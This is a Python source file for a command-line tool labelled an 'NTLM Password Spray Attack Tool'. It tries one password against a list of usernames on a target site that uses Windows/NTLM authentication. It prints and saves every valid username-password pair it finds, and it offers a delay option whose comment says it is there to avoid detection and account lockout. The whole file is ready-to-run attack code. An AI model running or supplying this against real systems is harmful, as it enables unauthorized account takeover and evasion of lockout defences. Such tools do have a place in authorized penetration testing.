import requests
from requests_ntlm import HttpNtlmAuth
import argparse
import time
import sys

# ANSI color codes
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class NTLMBruteForce:
    def __init__(self, users, fqdn, verbose=False, delay=0, timeout=10, output_file=None):
        self.users = users
        self.fqdn = fqdn
        self.verbose = verbose
        self.delay = delay
        self.timeout = timeout
        self.output_file = output_file
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_REDIRECT_CODE = 302
        self.HTTP_AUTH_FORBIDDEN_CODE = 403
        self.valid_credentials = []
    
    def password_spray(self, password, url):
        print("[*] Starting passwords spray attack using the following password: " + password)
        # Reset valid credential counter
        count = 0
        # Iterate through all of the possible usernames
        for user in self.users:
            try:
                # Make a request to the website and attempt Windows Authentication
                response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password), timeout=self.timeout)
                # Read status code of response to determine if authentication was successful
                if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                    print(Colors.GREEN + f"[+] Valid credential pair found! Username: {user} Password: {password}" + Colors.RESET)
                    self.valid_credentials.append({"username": user, "password": password})
                    count += 1
                    continue
                if (self.verbose):
                    if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                        print("[-] Failed login with Username: " + user)
                    elif (response.status_code == self.HTTP_AUTH_FORBIDDEN_CODE):
                        print("[-] Access forbidden for Username: " + user)
                    elif (response.status_code == self.HTTP_AUTH_REDIRECT_CODE):
                        print("[~] Redirect response for Username: " + user)
                    else:
                        print(f"[-] Unexpected status code {response.status_code} for Username: " + user)
            except requests.exceptions.Timeout:
                print(f"[!] Timeout for username: {user}")
            except requests.exceptions.ConnectionError:
                print(f"[!] Connection error for username: {user}")
            except Exception as e:
                print(f"[!] Error for username {user}: {str(e)}")
            
            # Add delay between attempts to avoid detection/lockout
            if self.delay > 0:
                time.sleep(self.delay)
        
        print("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
        
        # Save results to file if specified
        if self.output_file and self.valid_credentials:
            self.save_results()
    
    def save_results(self):
        try:
            with open(self.output_file, 'w') as f:
                f.write("Valid Credentials Found:\n")
                f.write("=" * 50 + "\n")
                for cred in self.valid_credentials:
                    f.write(f"Username: {cred['username']}\nPassword: {cred['password']}\n")
                    f.write("-" * 50 + "\n")
            print(Colors.GREEN + f"[+] Results saved to {self.output_file}" + Colors.RESET)
        except Exception as e:
            print(Colors.RED + f"[!] Error saving results: {str(e)}" + Colors.RESET)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTLM Password Spray Attack Tool")
    parser.add_argument("-u", "--userlist", required=True, help="File containing list of usernames (one per line)")
    parser.add_argument("-p", "--password", required=True, help="Password to spray")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-d", "--domain", required=True, help="Domain/FQDN")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds (default: 0)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output file to save valid credentials")
    
    args = parser.parse_args()
    
    # Read usernames from file
    try:
        with open(args.userlist, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: User list file '{args.userlist}' not found")
        exit(1)
    
    print(f"[*] Loaded {len(users)} users from {args.userlist}")
    if args.delay > 0:
        print(f"[*] Using {args.delay}s delay between requests")
    
    # Create instance and run password spray
    brute = NTLMBruteForce(users, args.domain, args.verbose, args.delay, args.timeout, args.output)
    brute.password_spray(args.password, args.target)